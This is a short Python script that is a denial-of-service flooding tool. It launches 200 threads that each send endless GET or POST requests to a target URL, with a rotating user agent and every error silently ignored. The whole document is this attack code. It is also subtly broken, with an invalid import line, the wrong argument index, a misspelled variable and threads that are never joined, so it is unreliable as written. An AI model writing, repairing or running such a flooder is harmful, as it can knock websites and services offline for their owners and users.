from sys import argv
from threading import Thread
import user_agent from utils.headers

import requests

method = argv[0]
url = argv[1]
threads = []

headers = {}

def sendReq(method: str, url: str, user_agent: str):
  if method == "get":
    headers["Content-Type"] = "text/html"
    headers["User-Agent"] = user_agent
    while 1:
      try:
        with requests.Session() as session:
          while 1:
            try:
              session.get(url, headers=headers)
            except:
              pass
      except:
        pass
  
  if method == "post":
    headers["Content-Type"] = "application/json"
    headers["User-Agent"] = user_agent
    while 1:
      try:
        with requests.Session() as session:
          while 1:
            try:
              session.post(url, headers=headers)
            except:
              pass
      except:
        pass

if __name__ == "__main__":
  for _ in range(200):
    t = Thread(target=sendReq, args=[
      memthod,
      url,
      user_agent()
    ], daemon=True)
    threads.append(t)
  for thread in threads:
    try:
      thread.start()
    except:
      print("Error creating Thread")